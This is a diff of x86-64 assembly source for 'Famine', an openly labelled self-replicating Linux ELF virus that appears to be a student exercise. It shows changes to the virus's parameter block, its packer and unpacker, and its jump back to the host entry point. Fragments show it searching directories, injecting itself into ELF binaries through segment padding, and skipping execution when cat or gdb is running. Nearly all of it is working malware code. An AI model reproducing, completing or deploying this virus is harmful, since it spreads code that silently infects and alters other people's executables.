@@ -1,10 +1,17 @@
+;-------------------------------------------------------------------------------
+;|     .-.               ______              _                                 |
+;|     |.|              |  ____|            (_)                                |
+;|   /)|`|(\            | |__ __ _ _ __ ___  _ _ __   ___                      |
+;|  (.(|'|)`)           |  __/ _` | '_ ` _ \| | '_ \ / _ \                     |
+;|    \`'./'            | | | (_| | | | | | | | | | |  __/        (_)          |
+;|_____|'|______________|_|  \__,_|_| |_| |_|_|_| |_|\___|_________\"\_________|
+;|    ,|'|.          ~~                            ~~               ^~^        |
+;-------------------------------------------------------------------------------
+
 section.text:
 	global _start:function
 
-;-------------------------------------------------------------------------------
-;|   r8   | virus entry in memory                                              |
-;-------------------------------------------------------------------------------
-
+; -== Optimization ==-
 ;-> Save bytes:
 ;	mov x, 1 => 5 bytes
 ;but:
@@ -14,14 +21,13 @@ section.text:
 ;and
 ;xor x, x => 3 bytes (put 0 into x)
 
-; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific order
-; (make sense with syscall)
+; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
+; order (make sense with syscall)
 
-_params:
-	length dq 0x0
-	vaddr dq 0x0
-	entry_inject dq 0x0
-	entry_prg dq 0x0
+_params:; filled for infected binaries
+	length dq 0x0; length of the packed virus
+	entry_inject dq 0x0; entry of the virus in file
+	entry_prg dq 0x0; entry of the prg
 
 _start:
 	call _inject; push addr to stack
@@ -31,7 +37,7 @@ signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 _inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
-	; r8 contains the entry of the virus
+	; r8 contains the entry of the virus (for infected file cpy)
 
 	; copy the prg in memory and launch it
 	xor rax, rax; = 0
@@ -40,7 +46,7 @@ _inject:
 
 	; host part
 	call _search_dir
-	jmp _end
+	jmp _end_host
 
 	.infected:
 		push rdx
@@ -64,15 +70,15 @@ _inject:
 		syscall
 
 		push rsi; save length
-; ==
+
 ;		memcpy(void *dst, void *src, size_t len)
 		push rax
 		pop rdi ; addr
 		lea rsi, [rel _params]
-		lea rdx, [rel _packed_part]
+		lea rdx, [rel _pack_start]
 		sub rdx, rsi
 		call _ft_memcpy
-; ==
+
 		mov r9, rdi; save addr
 ;		unpack(void *dst, void *src, size_t len)
 		add rdi, rdx
@@ -110,7 +116,15 @@ _inject:
 		syscall
 		pop rdx
 
-		jmp _end
+		; end infected file
+		push r8
+		pop rax
+
+		sub rax, [rel entry_inject]
+		add rax, [rel entry_prg]
+
+		; jmp on entry_prg
+		jmp rax
 
 ;                 v dst      v src       v size
 _unpack:; (void *rdi, void *rsi, size_t rdx)
@@ -127,10 +141,10 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 	push rdx
 	pop r11
 
+	xor rax, rax
 	xor rcx, rcx; i
 	xor r8, r8; j
 	.loop_uncompress:
-		xor rax, rax
 		cmp rcx, r11
 		jge .end_loop
 		cmp byte[r10 + rcx], 244
@@ -141,22 +155,18 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 			inc r8
 		jmp .loop_uncompress
 		.uncompress_char:
-; == Seems to works
-			inc rcx
 			mov rdi, r9
 			add rdi, r8
-			mov al, [r10 + rcx]
+			mov al, [r10 + rcx + 1]
 			mov rsi, rdi
 			sub rsi, rax
-			inc rcx
-			mov al, [r10 + rcx]
+			mov al, [r10 + rcx + 2]
 			mov rdx, rax
 			call _ft_memcpy
 			xor rax, rax
-			mov al, byte[r10 + rcx]
+			mov al, byte[r10 + rcx + 2]
 			add r8, rax
-			inc rcx
-; ==
+			add rcx, 3
 		jmp .loop_uncompress
 	.end_loop:
 		push r9
@@ -191,25 +201,8 @@ _ft_memcpy: ; (string rdi, string rsi, size_t rdx)
 	pop rcx
 ret
 
-_end:
-	xor rax, rax; = 0
-	cmp rax, [rel entry_inject]; if entry_inject is set we are in host
-	je _end_host
-
-	; infected file
-	push r8
-	pop rax
-
-	sub rax, [rel entry_inject]
-	add rax, [rel vaddr]
-
-	add rax, [rel entry_prg]
-	sub rax, [rel vaddr]
-
-	jmp rax
-
-; ============================================================== pack from there
-_packed_part:
+; packer-part till _eof --------------------------------------------------------
+_pack_start:
 _search_dir:
 	; check for process running
 	push 1
@@ -508,7 +501,7 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rsi, [rbx + 56 + 8] ; next->p_offset
 			sub rsi, rdi
 
-			add rdi, 8 * 4 ; let space for params
+			add rdi, 8 * 3 ; let space for params
 
 			; host
 			lea rdx, [rel _eof]
@@ -527,7 +520,7 @@ _infect_file: ; (string rdi, stat rsi)
 			push rax; save
 
 			lea rsi, [rel _start]
-			lea rdx, [rel _packed_part]
+			lea rdx, [rel _pack_start]
 			sub rdx, rsi
 			call _ft_memcpy
 
@@ -547,22 +540,19 @@ _infect_file: ; (string rdi, stat rsi)
 			.infected:
 			; TODO: CA NE MARCHERA JAAAMMAAAIIISS
 			mov rdx, [rel length]
-			sub rdx, 8 * 4
+			sub rdx, 8 * 3
 			; copy virus
 			add rdi, r13 ; addr pointer -> mmap
-			add rdi, 8 * 4
+			add rdi, 8 * 3
 			mov rsi, r8
 			call _ft_memcpy
 			mov rax, rdi
 
 			.params:
 			; add _params
-			sub rax, 8 * 4
-			add rdx, 8 * 4
+			sub rax, 8 * 3
+			add rdx, 8 * 3
 			mov [rax], rdx ; length
-			add rax, 8
-			mov rsi, [rbx + 16]
-			mov [rax], rsi ; vaddr
 			add rax, 8
 			sub rdi, r13
 			; copy mapped 'padding' like 0x400000
@@ -699,8 +689,7 @@ _check_file_process:; (string rdi)
 	pop r8
 ret
 
-
-; ================================ utils =======================================
+; -------------------------------- utils ---------------------------------------
 
 _ft_concat_path: ;(string rdi, string rsi) -> rdi is dest, must be in stack or mmaped region
 	push rdx
@@ -855,7 +844,8 @@ _ft_strcpy: ; (string rdi, string rsi)
 	pop rdx
 ret
 
-; ==============================================================================
+; ---------------------------- STATIC PARAMS -----------------------------------
+
 ;                   E     L    F   |  v ELFCLASS64
 elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 %ifdef FSOCIETY
@@ -870,9 +860,9 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 	process_status db `status`, 0x0
 	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
 
-; ===================================================================end of pack
-_end_of_pack:
 _eof:
+
+; ------------------------------- HOST ---------------------------------------
 
 ; don't need to copy the host part
 ; v
@@ -883,7 +873,6 @@ _end_host:
 	xor rdi, rdi; = 0
 	syscall
 
-; == TODO: Don't know if this works
 ;               v dest
 _pack: ;(void *rdi) -> ret size + fill rdi
 	push r8
@@ -895,8 +884,8 @@ _pack: ;(void *rdi) -> ret size + fill rdi
 	push rdx
 	push rsi
 
-	lea rdx, [rel _end_of_pack]
-	lea r10, [rel _packed_part] ; dictionary = addr
+	lea rdx, [rel _eof]
+	lea r10, [rel _pack_start] ; dictionary = addr
 	mov r11, r10; buffer = addr
 	sub rdx, r10; size
 
@@ -979,4 +968,3 @@ _pack: ;(void *rdi) -> ret size + fill rdi
 	pop r10
 	pop r8
 ret
-; ==
